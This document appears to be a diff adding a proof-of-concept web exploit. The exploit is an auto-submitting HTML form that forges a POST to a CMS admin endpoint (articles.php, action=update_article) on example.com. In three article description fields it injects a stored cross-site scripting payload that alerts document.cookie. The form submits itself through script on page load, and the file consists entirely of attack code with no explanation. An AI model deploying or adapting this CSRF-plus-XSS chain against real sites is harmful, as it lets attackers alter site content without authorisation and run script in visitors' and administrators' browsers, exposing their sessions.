@@ -1,0 +1,36 @@
+&lt;form action=&quot;http://www.example.com/admin/articles.php?tPath=1&aID=1&action=update_article&quot; method=&quot;post&quot; name=&quot;main&quot; enctype=&quot;multipart/form-data&quot; &gt;
+&lt;input type=&quot;hidden&quot; name=&quot;articles_status&quot; value=&quot;1&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;articles_date_available&quot; value=&quot;2010-06-04&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;authors_id&quot; value=&quot;&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;articles_date_added&quot; value=&quot;2010-06-04 00:00:00&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;x&quot; value=&quot;1&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;y&quot; value=&quot;2&quot; /&gt;
+
+&lt;input type=&quot;hidden&quot; name=&quot;articles_name[1]&quot; value=&quot;article name&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;articles_description[1]&quot; value='content&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;' /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;articles_url[1]&quot; value=&quot;&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;articles_head_title_tag[1]&quot; value=&quot;article title&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;articles_head_desc_tag[1]&quot; value=&quot;&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;articles_head_keywords_tag[1]&quot; value=&quot;&quot; /&gt;
+
+&lt;input type=&quot;hidden&quot; name=&quot;articles_name[2]&quot; value=&quot;article name&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;articles_description[2]&quot; value='content&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;' /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;articles_url[2]&quot; value=&quot;&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;articles_head_title_tag[2]&quot; value=&quot;article title&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;articles_head_desc_tag[2]&quot; value=&quot;&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;articles_head_keywords_tag[2]&quot; value=&quot;&quot; /&gt;
+
+&lt;input type=&quot;hidden&quot; name=&quot;articles_name[3]&quot; value=&quot;article name&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;articles_description[3]&quot; value='content&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;' /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;articles_url[3]&quot; value=&quot;&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;articles_head_title_tag[3]&quot; value=&quot;article title&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;articles_head_desc_tag[3]&quot; value=&quot;&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;articles_head_keywords_tag[3]&quot; value=&quot;&quot; /&gt;
+
+&lt;input type=&quot;hidden&quot; name=&quot;x&quot; value=&quot;3&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;y&quot; value=&quot;4&quot; /&gt;
+
+&lt;/form&gt;
+&lt;script&gt;
+document.main.submit();
+&lt;/script&gt;
